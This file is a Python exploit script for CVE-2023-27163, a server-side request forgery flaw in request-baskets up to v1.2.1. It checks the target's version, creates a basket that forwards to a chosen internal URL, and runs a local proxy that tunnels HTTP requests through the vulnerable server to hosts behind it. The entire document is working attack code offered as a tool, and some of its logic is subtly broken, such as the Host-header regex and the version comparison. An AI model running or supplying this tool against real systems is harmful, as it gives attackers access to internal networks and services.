# CVE-2023-27163
# Product: request-baskets
# Version: <= v1.2.1
# Vulnerability: Server-Side Request Forgery

import requests
import random
import socket
import re
import argparse
from urllib.parse import urlparse

def _readline(s: socket.socket) -> bytes:
    line = b""
    while (d := s.recv(1)) != b'\n':
        line += d
    return line + b'\n'

def _readhttp(s: socket.socket) -> str:
    message = ""
    content_length = 0
    while True:
        line = _readline(s).decode('utf-8')
        message += line
        if "Content-Length" in line:
            content_length += int(line[16:-2])
        if line == '\r\n':
            break
    for _ in range(content_length):
        message += s.recv(1).decode('utf-8')
    return message

def _proxy(host: str, host_port: int, basket_name: str, listen_addr: str, listen_port: int, additional_headers: dict = {}):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((listen_addr, listen_port))
    s.listen(40)
    while True:
        conn, _ = s.accept()
        print("New connection")
        req = _readhttp(conn)
        print(req)
        req = re.sub(r'((GET)|(POST)|(DELETE)|(PUT)|(OPTIONS)|(HEAD)|(CONNECT)) /', fr'\1 /{basket_name}/', req, 1)
        for name, val in additional_headers.items():
            req = re.sub(r"HTTP/1.1\r\n", f"HTTP/1.1\r\n{name}: {val}\r\n", req, 1)
        req = re.sub(r'\r\\nHost: \S+\\r\\n', f'\r\nHost: {host}\r\n', req, 1)
        print(f"Modified to: \n{req}")
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((host, host_port))
        c.sendall(req.encode('utf-8'))
        res = _readhttp(c)
        c.close()
        print(res)
        conn.sendall(res.encode('utf-8'))
        conn.close()

def check(host: str) -> bool:
    try:
        res = requests.get(f"{host}/web")
    except:
        return False
    ver_match = re.search(r"Version: [\S ]+v(\d+\.\d+\.\d+)", res.text)
    if ver_match is None:
        return False

    version = ver_match.group(1)
    try:
        ver_parts = map(int, version.split('.'))
    except:
        return False
    
    max_ver = [1, 2, 1]
    if any((v, m) for v, m in zip(ver_parts, max_ver) if v > m):
        return False
    return True

def exploit(host: str, target: str, local_addr: str, local_port: str):
    basket_name = ''.join([chr(random.randint(ord('a'), ord('z'))) for _ in range(8)])
    print(f"Basket name: {basket_name}")
    api_url = f"{host_url}/api/baskets/{basket_name}"

    payload = {"forward_url": target_url,
               "proxy_response": True,
               "insecure_tls": False,
               "expand_path": True,
               "capacity": 250}
    try:
        res = requests.post(api_url, json=payload)
    except:
        return False
    try:
        token = res.json()["token"]
    except:
        return False
    print(f"Token: {token}")
    print(f"Listening on http://{listen_addr}:{listen_port}...")
    _proxy(urlparse(host_url).hostname, urlparse(host_url).port, basket_name, listen_addr, listen_port, {"Authorization": token})    
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Utilises an SSRF vulnerability in request-baskets v1.2.1 and lower to create a tunnel to a device which is accessible to the host running request-baskets. All HTTP requests sent to the local tunnel will be forwarded through request-baskets to a specified host 'behind' the request-baskets.""")
    parser.add_argument("host", type=str, help="The host URL which request-baskets is running on (http://host:port)")
    parser.add_argument("target", type=str, help="The URL of the target which the host will forward requests to (http://host:port)")
    parser.add_argument("--local_addr", "-l", type=str, default="127.0.0.1", help="The address the local tunnel should listen on")
    parser.add_argument("--local_port", "-p", type=int, default=80, help="The port the local tunnel should listen on")
    parser.usage 
    args = parser.parse_args()
    host_url = args.host
    host_url = f"{'http://' if 'http' not in host_url else ''}{host_url}"
    target_url = args.target
    target_url = f"{'http://' if 'http' not in target_url else ''}{target_url}"
    listen_addr = args.local_addr
    listen_port = args.local_port
    
    print("Checking if target is vulnerable...")
    if not check(host_url):
        print("Target does not appear to be vulnerable. Exiting...")
    else:
        print("Target seems vulnerable. \nAttempting exploit...")
        success = exploit(host_url, target_url, listen_addr, listen_port)
        if not success:
            print("Exploit failed.")